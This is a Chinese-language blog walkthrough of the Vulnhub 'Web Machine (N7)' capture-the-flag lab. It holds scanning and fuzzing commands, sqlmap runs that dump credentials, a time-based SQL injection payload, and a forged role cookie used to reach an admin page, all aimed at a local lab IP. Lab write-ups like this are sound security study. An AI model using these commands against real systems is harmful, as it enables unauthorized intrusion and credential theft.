---
layout: post
title: Web Machine (N7)
subtitle: Web Machine (N7)
date: 2022-12-09 20:35
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - Vulnhub
  - 靶场实战
---
## Web Machine (N7)

靶机ip：192.168.56.101

kali攻击机ip：192.168.56.102

注：关于vmware和virtual box虚拟机如何建立网络连接，详见：[不同虚拟化平台的虚拟机之间进行网络通信 - 简书](https://www.jianshu.com/p/632d91db9430)

### 1. 使用nmap扫描c段

```shell
nmap -sS 192.168.56.0/24
# 发现192.168.56.101
nmap -sV -sC -A 192.168.56.101
# 发现只有80端口开放
```
### 2. 扫描目录

```shell
dirb http://192.168.56.101
# http://192.168.56.101/index.html
# http://192.168.56.101/server-status
```

在浏览器查看，未发现有效信息，继续扫描

```shell
wfuzz -w /usr/share/fuzzDicts/ctfDict/ctf.txt --hc 404 http://192.168.56.101/FUZZ

ffuf -u "http://192.168.56.101/FUZZ" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 404 -e .html,.txt,.php,.zip
```

发现exploit.html文件，访问并提交文件，发现跳转到localhost。将localhost改为靶机ip尝试。

![image-20221209203518987.png](https://kyonk.v6.army:1443/Zk10Bb.png)

点击提交，得到部分flag `FLAG{N7`

通过扫描得到`enter_network/index.php` 和 `enter_network/admin.php` 。第一个为登陆界面，第二个需要admin权限。接下来可以对登陆界面使用sqlmap检测是否有注入漏洞，或是bp抓包分析。

### 3. 使用sqlmap进行sql注入

```shell
sqlmap -u "http://192.168.56.101/enter_network/" --forms --dbs --current-db
# 数据库名 Machine
```

![image-20221209174849702.png](https://kyonk.v6.army:1443/hMbCrZ.png)

```shell
sqlmap -u "http://192.168.56.101/enter_network/" --forms --batch -D "Machine" --tables
```

得到tables: login

```shell
sqlmap -u "http://192.168.56.101/enter_network/" --forms --batch -D "Machine" -T "login" --columns
```

得到colums: password;role;username

```shell
sqlmap -u "http://192.168.56.101/enter_network/" --forms --batch -D "Machine" -T "login" -C "username,role,password" --dump
# username:administrator
# role:admin
# password:FLAG{N7:KSA_01}
```

![image-20221209174731002.png](https://kyonk.v6.army:1443/5AH2sR.png)

### 4. bp抓包分析

![image-20221209205529082.png](https://kyonk.v6.army:1443/nKhqbY.png)

response中set-Cookie中`%253D`为=

```
MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=
# 尝试进行base64解密
21232f297a57a5a743894a0e4a801fc3
# 32位尝试MD5解密
admin
```

思路1：用户名处输入`1'+or+sleep(3)--+`发现有注入漏洞，可根据时间盲注，结合bp或sqlmap。

思路2：根据此漏洞猜解用户名，不如思路1。

思路3：针对admin.php，修改request中cookie中role为admin

![image-20221209212032503.png](https://kyonk.v6.army:1443/gAMIcc.png)

得到：   `KSA_01}`